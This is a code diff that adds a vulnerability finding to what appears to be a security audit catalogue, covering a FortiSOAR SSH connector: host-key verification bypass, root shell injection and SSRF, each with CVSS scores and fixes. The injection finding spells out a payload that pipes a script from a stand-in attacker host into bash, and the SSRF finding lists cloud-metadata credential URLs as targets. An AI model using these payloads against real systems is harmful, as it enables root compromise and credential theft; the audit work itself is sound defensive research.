@@ -1231,3 +1231,121 @@ FSR_F17_JSCODE_SNIPPET_RCE = {
         "Simpler payload, no RestrictedPython hurdle."
     ),
 }
+
+# FSR-F18: SSH connector -- three-part attack surface
+# Component: cyops-connector-ssh v2.1.3 (builtins.py)
+# Copyright notice: 2008-2026 Fortinet Inc. (actively maintained)
+#
+# Sub-finding A: AutoAddPolicy SSH host key bypass (CWE-295)
+#   builtins.py:57-59:
+#     # FIXME: there should probably be some verification here instead of
+#     # blindly adding to known_hosts
+#     client.set_missing_host_key_policy(paramiko.client.AutoAddPolicy())
+#
+#   Developer left the FIXME comment in production code. AutoAddPolicy() accepts any
+#   host key without verification and silently adds it to known_hosts.
+#   MITM attacker can intercept SSH connection between FortiSOAR and target host,
+#   present a forged key, and receive all transmitted data including:
+#   - SSH credentials (username + password or private key passphrase)
+#   - All commands executed on the target
+#   - All command output returned to FortiSOAR
+#   - Private keys if password-encrypted
+#   CVSS: AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N = 6.8 MEDIUM
+#   (Adjacent network, high complexity -- MITM position required)
+#
+# Sub-finding B: super_user_password shell injection (CWE-78)
+#   builtins.py:113-116:
+#     if params.get('is_super_user', False):
+#         if config.get('super_user_password', None):
+#             cmd = 'echo ' + config.get('super_user_password') + ' | sudo ' + cmd
+#
+#   String concatenation builds a shell command string. paramiko exec_command()
+#   passes the full string to the remote SSH server's shell (/bin/sh -c).
+#   If super_user_password contains shell metacharacters, attacker injects arbitrary
+#   commands that execute AS ROOT on the remote SSH target (via sudo).
+#
+#   Example payload (super_user_password config field):
+#     "P@ss; curl http://attacker.com/shell.sh | bash; echo"
+#   Resulting command on remote server:
+#     /bin/sh -c 'echo P@ss; curl http://attacker.com/shell.sh | bash; echo | sudo <cmd>'
+#
+#   Attack precondition: FortiSOAR user with connector config edit rights.
+#   Impact: arbitrary OS command execution as root on the remote SSH target.
+#   This is scope-changed -- the FortiSOAR connector is the vulnerable component,
+#   but compromise lands on the external SSH server.
+#   CVSS: AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H = 9.9 CRITICAL (CWE-78)
+#
+# Sub-finding C: private key SSRF via make_request (CWE-918)
+#   builtins.py:23-26:
+#     if config.get('private_key', {}).get('@type') == "File":
+#         url = config.get('private_key', {}).get('@id')
+#         config["private_key"] = make_request(url, 'GET')
+#
+#   make_request() is integrations.crudhub.make_request -- FortiSOAR's authenticated
+#   internal API client. The '@id' URL comes from user-controlled connector config.
+#   If URL validation is absent (unconfirmed -- make_request source not yet extracted),
+#   attacker can set '@id' to an internal service URL to exfiltrate data:
+#   - http://169.254.169.254/latest/meta-data/ (EC2 IMDSv1 credential theft)
+#   - http://localhost:5432/ (PostgreSQL banner)
+#   - http://localhost:15672/ (RabbitMQ management API)
+#   The private key content is returned to the FortiSOAR API response and visible
+#   to the attacker via playbook output.
+#   CVSS (pending make_request validation check): AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N = 6.5 HIGH
+#   CWE-918: Server-Side Request Forgery
+#
+# Note: run_sftp_copy() contains a latent bug -- sftp.putfo(file_obj, remote_path + uuid.uuid4())
+#   will raise TypeError in Python 3 (str + UUID). Function is dead code / broken.
+
+FSR_F18_SSH_CONNECTOR_VULNERABILITIES = {
+    "id": "FSR-F18",
+    "title": "SSH connector -- AutoAddPolicy MITM, super_user_password shell injection, private key SSRF",
+    "severity": "CRITICAL",
+    "cvss": "9.9",
+    "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+    "cwe": "CWE-78, CWE-295, CWE-918",
+    "component": "cyops-connector-ssh v2.1.3",
+    "source_file": "builtins.py:59,116,26",
+    "copyright": "2008-2026 Fortinet Inc. (actively maintained)",
+
+    "sub_findings": {
+        "F18a": {
+            "title": "AutoAddPolicy -- no SSH host key verification",
+            "cwe": "CWE-295",
+            "cvss": "6.8",
+            "cvss_vector": "AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+            "location": "builtins.py:59",
+            "evidence": "client.set_missing_host_key_policy(paramiko.client.AutoAddPolicy())",
+            "developer_note": "FIXME: there should probably be some verification here instead of blindly adding to known_hosts",
+            "impact": "MITM attacker intercepts SSH session; receives credentials, all commands, all output",
+        },
+        "F18b": {
+            "title": "super_user_password shell injection on remote SSH target",
+            "cwe": "CWE-78",
+            "cvss": "9.9",
+            "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+            "location": "builtins.py:116",
+            "evidence": "cmd = 'echo ' + config.get('super_user_password') + ' | sudo ' + cmd",
+            "payload": "P@ss; curl http://attacker.com/shell.sh | bash; echo",
+            "impact": "Arbitrary root command execution on remote SSH target via sudo",
+            "precondition": "FortiSOAR user with SSH connector config edit rights",
+        },
+        "F18c": {
+            "title": "Private key fetch SSRF via make_request",
+            "cwe": "CWE-918",
+            "cvss": "6.5",
+            "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+            "location": "builtins.py:26",
+            "evidence": "config['private_key'] = make_request(config['private_key']['@id'], 'GET')",
+            "internal_targets": ["http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                                  "http://localhost:5432/", "http://localhost:15672/"],
+            "status": "PLAUSIBLE -- make_request URL validation not yet confirmed",
+        },
+    },
+
+    "fix": (
+        "F18a: Replace AutoAddPolicy with RejectPolicy or known-hosts file validation. "
+        "F18b: Use subprocess list form instead of shell string: "
+        "['/bin/sudo', '-S', cmd] with password piped to stdin separately. "
+        "F18c: Validate that private_key @id URL is a FortiSOAR-local IRI (starts with /api/3/files/)."
+    ),
+}
